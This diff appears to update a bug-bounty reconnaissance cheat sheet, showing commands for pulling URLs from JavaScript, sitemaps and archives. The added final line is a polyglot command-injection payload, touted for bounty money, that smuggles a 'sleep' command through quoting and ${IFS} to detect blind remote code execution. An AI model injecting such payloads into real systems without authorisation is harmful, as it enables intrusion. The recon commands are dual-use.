@@ -32,6 +32,7 @@ cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))
 	./svn-extractor.py --url http://url.com --match database.php
 
 	**Finding hidden get parameters: 
+	
    Note: 	   	
 	https://github.com/tomnomnom/assetfinder
 	https://github.com/lc/gau
@@ -158,3 +159,4 @@ assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)
 ## Extracting all the urls from sitemap
 	-curl -s domain.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
 
+## A single #RCE payload rule them all , easy 6000$ ;) 1;sleep${IFS}9;#${IFS}’;sleep${IFS}9;#${IFS}”;sleep${IFS}9;#${IFS}
